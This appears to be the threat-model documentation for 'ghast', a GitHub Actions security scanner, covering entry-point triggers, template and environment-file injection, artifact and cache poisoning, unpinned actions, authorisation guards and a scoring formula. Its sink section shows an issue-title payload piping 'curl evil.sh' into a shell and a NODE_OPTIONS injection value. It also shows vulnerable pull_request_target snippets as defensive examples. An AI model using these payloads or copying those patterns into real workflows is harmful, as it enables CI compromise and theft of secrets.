# Threat model: what an attacker can do with your CI

This is the reasoning `ghast` encodes. It is written to be argued with — if a claim
here is wrong, the fix is one table in [`ghast/knowledge.py`](../ghast/knowledge.py),
not a rewrite.

---

## 1. The asset

A GitHub Actions job is a shell on a machine that holds credentials. The credentials
vary, and that variation is the whole game:

| The job has | Which means an attacker who runs code in it can |
|---|---|
| `GITHUB_TOKEN` with `contents: write` | push commits, including to `.github/workflows/` — persistence |
| `GITHUB_TOKEN` with `packages: write` | publish a poisoned package to every consumer |
| `GITHUB_TOKEN` with `id-token: write` | mint an OIDC token and assume a cloud role |
| a named secret (`secrets.NPM_TOKEN`) | use it directly; log masking is not a boundary |
| nothing, on a GitHub-hosted runner | steal the workspace, poison the cache, poison artifacts |
| nothing, on a **self-hosted** runner | all of the above, plus leave something behind |

The last row is the one people underrate. A GitHub-hosted runner is destroyed after the
job. A self-hosted runner is a computer. Code execution on it is not an incident scoped
to one workflow run; it is a foothold that the *next* job inherits — including the
privileged one that runs on `push` to `main`.

This is why `ghast` scores code execution on a self-hosted runner at 9.0 even when the
triggering workflow holds no secrets at all, and why it deliberately does **not** apply
that reasoning to ephemeral managed runners (`blacksmith-*`, `depot-*`, `warp-*`,
`namespace-profile-*`). Those are fresh VMs per job. They carry a different, real risk —
a third party now sits in your build path — but not the persistence risk.

---

## 2. The attacker

Three populations, and the difference between them is most of the severity:

**Anyone with a GitHub account.** No relationship to the repository. They can open an
issue, comment on any public issue or pull request, open a pull request from a fork,
review someone else's pull request, star, fork, and (where enabled) edit the wiki.
Every one of those is a workflow trigger, and every one carries free-text they chose.

**Someone with push access.** An insider, or a maintainer whose account or token was
taken. They additionally control release notes, milestones, `workflow_dispatch` inputs
and `repository_dispatch` payloads.

**Nobody — the value is constrained.** `github.event.issue.number` is an integer.
`github.actor` is a login. `github.sha` is hex. `ghast` treats these as untainted, which
is the main reason its output is short enough to read.

`ACTOR_MULTIPLIER` in [`findings.py`](../ghast/findings.py) is `1.0`, `0.35` for the
first two. A bug any drive-by account can trigger is not the same bug as one that needs
a compromised maintainer, and a report that scores them identically is not a report.

---

## 3. The entry points

An expression like `${{ github.event.issue.title }}` is only a source if some trigger on
that workflow actually populates it. `PAYLOAD_EVENTS` maps paths to the events that
supply them, and a workflow that mentions a path no trigger can populate is silently
correct.

Ranked by what the trigger grants:

### `pull_request_target` — secrets, write token, outsider-reachable

The trigger exists so a workflow can act on a fork's pull request *with* repository
credentials. To make that safe GitHub does two things: it runs the workflow definition
from the **base** branch, so a contributor cannot edit the workflow itself; and it checks
out the **base** commit, so contributor code is not on disk.

The second protection is one line away from being switched off:

```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← the whole point, undone
      - run: npm ci                                        # ← and now it executes
```

Attacker code is now on a runner with full secrets. `npm ci` runs whatever lifecycle
scripts `package.json` declares. This is the "pwn request", and it is `GHAST010`
(the checkout) plus `GHAST011` (the thing that executes).

Note what `GHAST011` must not do: `npm install -g some-pinned-package` after the same
checkout is harmless — it fetches a named package from a registry and never reads the
tree. Getting this distinction wrong produces confident, wrong criticals, so
`detect_repo_code_execution` looks at the arguments rather than matching a substring.

### `issue_comment`, `issues`, `discussion*`, `pull_request_review*` — secrets, write token, anyone

These run on the default branch with the full token, and anyone on the internet can fire
them by typing into a text box. A `run:` block that interpolates the comment body is a
direct path from "types a sentence" to "pushes to main".

### `workflow_run` — secrets, write token, fires after untrusted code ran

The privilege-separation pattern GitHub recommends: build untrusted code in an
unprivileged `pull_request` workflow, upload an artifact, then do the privileged part in
a `workflow_run` workflow that never checks out the head.

It works, and it moves the trust boundary onto the artifact — which was written by the
attacker's workflow run. Three things can happen to it, and they are not equal:

1. **The bytes are executed.** `source ./results/env.sh`, `bash ./artifact/run.sh`.
   Certain compromise.
2. **The download lands in the workspace.** With no `path:` on `download-artifact`, it
   unpacks into `$GITHUB_WORKSPACE` — on top of the checkout. An artifact containing
   `scripts/report.js` overwrites the trusted `scripts/report.js` that the next step
   runs. Likely compromise, and easy to miss when reading the workflow.
3. **A repo-owned script reads it as data.** Exploitability now depends on that script.
   Worth a line in a report; not a critical.

The fix for (2) is one key:

```yaml
- uses: actions/download-artifact@<sha>
  with:
    path: ./untrusted-artifact     # outside the checkout
```

### `pull_request` from a fork — no secrets, read-only token, anyone

Frequently written off as safe. It is not:

- code executes on the runner, which matters enormously if that runner is self-hosted;
- the job can **write cache entries**. Actions caches are scoped per branch but fall
  back to the default branch, so a fork pull request can seed a cache that a privileged
  default-branch workflow later restores and executes (`GHAST023`);
- the job can **upload artifacts** that a `workflow_run` workflow will consume.

Fork pull requests are where poisoning *originates*, even though the privilege is
elsewhere.

---

## 4. The sinks

### Template injection into `run:`

`${{ }}` is substituted into the script text before any shell sees it. There is no
quoting that helps, because the quotes are also just text:

```yaml
run: echo "Title: ${{ github.event.issue.title }}"
```

An issue titled `" ; curl evil.sh | sh ; "` closes the string and appends commands. The
fix is to move the value out of the program and into the environment:

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "$TITLE"
```

Now the shell receives the script and the data separately. This is the documented
guidance and `ghast` reports nothing for it.

### Environment-file injection — the one that gets missed

The environment fix only holds while the value stays data. Writing it back out breaks
that:

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "SLUG=$TITLE" >> $GITHUB_ENV
```

The runner parses `$GITHUB_ENV` **line by line** when the step ends. An issue title of:

```
harmless
NODE_OPTIONS=--require /tmp/payload.js
```

produces two lines, and the second becomes an environment variable for every later step
in the job. `NODE_OPTIONS` makes Node load a file. `BASH_ENV` makes bash source one.
`LD_PRELOAD` does it for anything dynamically linked. `PATH` reorders the whole world.

No `${{ }}` appears in a dangerous position, and the value was carefully routed through
the environment exactly as recommended — and it is still arbitrary code execution.
That is `GHAST003`, and it is why `ghast` models the environment files as sinks in their
own right rather than only tracking where variables are read.

The mitigation is the delimited form with an unguessable delimiter:

```bash
DELIM="ghadelim_$(openssl rand -hex 16)"
{ echo "SLUG<<$DELIM"; echo "$TITLE"; echo "$DELIM"; } >> "$GITHUB_ENV"
```

A fixed delimiter like `EOF` is not enough: the attacker simply includes `EOF` in the
value.

### Code-executing action inputs

`actions/github-script` evaluates its `script:` input as JavaScript with an
authenticated Octokit client in scope. Interpolating into it is interpolating into a
program. The fix is the same shape: put the value in `env:`, read `process.env.X`.

### Third-party action inputs

Everything else that receives attacker data is a *lead*, not a finding. `ghast` reports
these (`GHAST007`) at low severity with `confidence: speculative` and says so in the
output, because the action's source has not been analysed and most such inputs are only
ever rendered.

---

## 5. Supply chain

`uses: someone/action@v3` is "run whatever is at this pointer, in this job, with these
credentials". Tags and branches are pointers the owner can move. This is not theoretical:
the 2025 `tj-actions/changed-files` compromise moved existing version tags to a malicious
commit, and every repository using the floating tag executed it on the next run.

Pinning to a 40-character commit SHA fixes it, because a SHA is the content:

```yaml
- uses: owner/action@e1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4  # v4.1.1
```

`ghast` weights this by consequence rather than reporting every unpinned action
identically. A floating tag in a job with `contents: write` and secrets is not the same
as one in a read-only job; `actions/*` is not the same as an account you have never
heard of; and a branch ref is worse than a version tag, because a tag is at least
conventionally cut from a reviewed release. Most of these land at `low` or `info` — which
is the point. They belong in a backlog, not in your face above a pwn request.

---

## 6. Authorisation checks people actually write

A privileged workflow gated on who the actor is, is a genuinely different risk, and a
scanner that ignores `if:` conditions will be muted within a day. `ghast` recognises:

**Strong.**
`github.event.pull_request.head.repo.full_name == github.repository` (branches of this
repo, not forks); `author_association` against `OWNER`/`MEMBER`/`COLLABORATOR`;
`github.actor` against a literal or an allow-list; `github.repository` pinned to one
repository — which also stops the workflow running in every fork.

**Strong, delegated.** The common shape where a first job computes authorisation and
later jobs gate on its output:

```yaml
if: needs.check-permissions.outputs.is_authorized == 'true'
```

`ghast` resolves `check-permissions` in the same workflow and looks for evidence that it
inspects the actor — `author_association`, `getCollaboratorPermissionLevel`, a
membership check. If the gate job does not appear to check anything, the guard is
downgraded to weak and the report says why.

**Weak.**
*Label gates* (`contains(github.event.pull_request.labels.*.name, 'safe-to-test')`) are
the most common pattern and the most misunderstood. A maintainer reads a benign diff and
applies the label — and the label survives every subsequent push to that pull request.
The attacker pushes the payload afterwards. Unless the workflow removes the label on
`synchronize`, the approval was for a commit that is no longer there. The same applies
to `github.event.review.state == 'approved'`.

*Bot identity* (`github.actor == 'dependabot[bot]'`) on `pull_request_target` is
`GHAST014`. It establishes who opened the pull request, and says nothing about the diff —
which carries dependency names, versions and changelog text from outside.

**Not a guard.** `github.event.pull_request.draft == false`. `user.type != 'Bot'`.
`contains(github.event.comment.body, '/deploy')` — that is a command parser, not
authentication; anyone can type the magic word.

---

## 7. Scoring

```
score = impact × actor_multiplier × guard_multiplier × confidence_multiplier
```

| Factor | Values |
|---|---|
| impact | 10.0 secrets+write · 9.0 self-hosted persistence · 8.5 secrets · 6.0 runner only · 3.5 argument injection · 2.5 hygiene |
| actor | 1.0 any GitHub user · 0.7 after maintainer approval · 0.35 needs write access |
| guard | 1.0 none · 0.8 weak · 0.3 strong |
| confidence | 1.0 certain · 0.8 likely · 0.6 speculative |

Bands: ≥9.0 critical, ≥7.0 high, ≥4.0 medium, ≥2.0 low.

The numbers are arguable and that is deliberate: `--explain` prints every factor and the
arithmetic, so a maintainer who thinks a finding is overrated can see precisely which
assumption to dispute rather than dismissing the tool.

---

## 8. What this model does not cover

- **Reusable workflows.** A job with `uses: org/repo/.github/workflows/x.yml@v1` is not
  followed into its definition. Taint that crosses that boundary is missed.
- **Action internals.** Inputs to third-party actions are flagged as leads. Analysing
  the action's own source would turn many of those into real findings or dismiss them.
- **Multi-line heredocs into `$GITHUB_ENV`.** The single-line `>>` form is modelled; the
  braced multi-line form is only partly so.
- **Runtime configuration.** Whether the repository requires approval for first-time
  contributors, whether its default token permissions are read-only, whether a
  self-hosted runner is ephemeral — none of that is in the workflow file. `ghast` reasons
  about the file and states its assumptions in the output rather than guessing.
- **`actions/github-script` outputs.** Taint reaching a script is tracked; taint the
  script writes back via `core.setOutput` is not.

---

## References

- [Keeping your GitHub Actions and workflows secure: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) — GitHub Security Lab
- [Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions) — GitHub Docs
- [Workflow commands: environment files](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions#environment-files) — GitHub Docs
- [Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication) — GitHub Docs
